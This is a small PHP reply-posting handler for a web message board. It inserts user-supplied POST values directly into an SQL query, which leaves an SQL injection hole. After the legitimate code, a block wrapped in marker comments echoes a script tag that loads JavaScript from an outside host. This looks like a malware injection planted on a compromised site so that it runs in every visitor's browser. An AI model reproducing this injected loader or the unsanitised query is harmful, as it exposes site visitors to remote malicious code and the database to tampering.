<?
	session_start();
	include('./lib.php');
	$connect = db_connect($db_host, $db_user, $db_pass,$db_name);
	$board_no=$_POST['board_no'];
	$r_content=$_POST['reply_text'];
	if($r_content!="" && $board_no!=''){
		$sql="insert into Vocals_freeboard_reply (board_no,reply_writer_id, reply_content, reply_date) values (trim('$board_no'),trim('$_SESSION[user_id]'), trim('$r_content'), now())";
		mysql_query($sql);
		echo "success";
	}else{
		echo "fail";
	}
?>
<?php
#2f6a20#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155810\"></script>";
echo $vt;
}
#/2f6a20#
?>